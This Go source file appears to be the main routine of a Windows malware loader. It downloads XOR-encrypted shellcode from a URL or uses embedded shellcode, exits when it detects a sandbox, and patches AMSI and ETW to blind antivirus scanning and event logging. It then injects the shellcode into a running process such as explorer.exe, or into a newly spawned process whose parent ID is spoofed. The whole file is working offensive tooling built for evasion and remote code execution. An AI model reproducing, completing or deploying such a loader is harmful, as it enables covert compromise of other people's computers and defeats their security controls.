//go:build windows

package main

import (
	"flag"
	"fmt"
	"os"
	"syscall"
)

func main() {
	mode    := flag.String("mode", "stager", "stager: fetch from URL  |  direct: embedded shellcode")
	rawURL  := flag.String("url", "", "shellcode URL (stager mode)")
	hexKey  := flag.String("key", "", "hex XOR decryption key (stager mode)")
	target  := flag.String("target", "", "inject into this existing process (e.g. explorer.exe)")
	spawn   := flag.String("spawn", "", "spawn this process and inject into it (e.g. RuntimeBroker.exe)")
	ppidStr := flag.String("ppid", "explorer.exe", "process to spoof as parent when using -spawn")
	flag.Parse()

	if *target == "" && *spawn == "" {
		fmt.Fprintln(os.Stderr, "[-] provide -target <process.exe> or -spawn <process.exe>")
		os.Exit(1)
	}

	if isSandbox() {
		os.Exit(0)
	}

	patchAMSI()
	patchETW()

	// Get shellcode
	var sc []byte
	var err error
	switch *mode {
	case "stager":
		if *rawURL == "" {
			fmt.Fprintln(os.Stderr, "[-] -url required for stager mode")
			os.Exit(1)
		}
		sc, err = fetchShellcode(*rawURL, *hexKey)
		if err != nil {
			fmt.Fprintln(os.Stderr, "[-] fetch:", err)
			os.Exit(1)
		}
	case "direct":
		sc = loadDirect()
		if len(sc) < 2 {
			fmt.Fprintln(os.Stderr, "[-] shellcode.go not populated — edit xorKey and encShellcode before compiling")
			os.Exit(1)
		}
	default:
		fmt.Fprintln(os.Stderr, "[-] unknown mode:", *mode)
		os.Exit(1)
	}

	// Injection path
	if *spawn != "" {
		// Spawn a sacrificial process with spoofed parent, then inject
		parentPID, err := findPIDByName(*ppidStr)
		if err != nil {
			fmt.Fprintln(os.Stderr, "[-] finding ppid process:", err)
			os.Exit(1)
		}
		pid, hProc, err := spawnSpoofed(*spawn, parentPID)
		if err != nil {
			fmt.Fprintln(os.Stderr, "[-] spawn:", err)
			os.Exit(1)
		}
		defer syscall.CloseHandle(hProc)

		if err := injectRemote(hProc, sc); err != nil {
			fmt.Fprintln(os.Stderr, "[-] inject:", err)
			os.Exit(1)
		}
		_ = pid
	} else {
		// Inject into existing process by name
		pid, err := findPIDByName(*target)
		if err != nil {
			fmt.Fprintln(os.Stderr, "[-] finding target:", err)
			os.Exit(1)
		}
		if err := injectByPID(pid, sc); err != nil {
			fmt.Fprintln(os.Stderr, "[-] inject:", err)
			os.Exit(1)
		}
	}
}
